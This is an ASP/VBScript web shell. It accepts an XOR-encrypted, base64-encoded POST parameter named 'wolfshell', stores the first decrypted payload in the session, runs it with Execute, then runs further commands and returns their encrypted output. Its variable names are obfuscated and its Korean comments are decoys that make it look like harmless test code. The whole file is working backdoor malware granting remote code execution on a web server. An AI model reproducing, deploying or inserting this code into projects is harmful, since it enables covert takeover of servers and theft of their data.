<%
' // 이 주석은 아무 의미가 없습니다.
Set main_dict_h7 = Server.CreateObject(Replace("Scripting*Dictionary", "*", "."))
Function decode_b64_g3(input_str_k8)
    Dim x_obj, x_node
    Set x_obj = CreateObject("Msxml2.DOMDocument.3.0")
    Set x_node = x_obj.CreateElement("b64")
    x_node.dataType = "bin.base64"
    x_node.text = input_str_k8
    decode_b64_g3 = x_node.nodeTypedValue
    Set x_node = Nothing
    Set x_obj = Nothing
End Function
Function encode_b64_g4(input_raw_k9)
    ' // 배고파요, 치킨 먹고 싶다
    Dim x_obj_2, x_node_2
    Set x_obj_2 = CreateObject("Msxml2.DOMDocument.3.0")
    Set x_node_2 = x_obj_2.CreateElement("b64")
    x_node_2.dataType = "bin.base64"
    x_node_2.nodeTypedValue = input_raw_k9
    encode_b64_g4 = x_node_2.text
    Set x_node_2 = Nothing
    Set x_obj_2 = Nothing
End Function
Function transform_content_f5(chunk, is_bin_mode)
    dim chunk_s, i, result_s, k_s, secret_k
    secret_k = CStr("3c6e0b8a9c15224a")
    k_s = len(secret_k)
    Set data_stream = CreateObject("ADODB.Stream")
    ' // 그냥 한번 해보는거지
    data_stream.CharSet = "iso-8859-1"
    data_stream.Type = 2
    data_stream.Open
    if IsArray(chunk) then
        chunk_s=UBound(chunk)+1
        For i=1 To chunk_s
            data_stream.WriteText chrw(ascb(midb(chunk,i,1)) Xor Asc(Mid(secret_k,(i mod k_s)+1,1)))
        Next
    end if
    data_stream.Position = 0
    if is_bin_mode then
        data_stream.Type = 1
        transform_content_f5=data_stream.Read()
    else
        ' // 퇴근하고 싶다.
        transform_content_f5=data_stream.ReadText()
    end if
End Function
private_key="3c6e0b8a9c15224a"
post_data=request.Form("wolfshell")
if not IsEmpty(post_data) then
    if  IsEmpty(Session("sess_p")) then
        data_chunk=transform_content_f5(decode_b64_g3(post_data),false)
        Session("sess_p")=data_chunk
        response.End
    else
        data_chunk=transform_content_f5(decode_b64_g3(post_data),true)
        main_dict_h7.Add "sess_p",Session("sess_p")
        Execute(main_dict_h7.Item("sess_p"))
        run_result=run(data_chunk)
        ' // 이 코드는 테스트용입니다.
        response.Write("a71ab1")
        if not IsEmpty(run_result) then
            response.Write encode_b64_g4(transform_content_f5(run_result,true))
        end if
        response.Write("4b8259")
    end if
end if
%>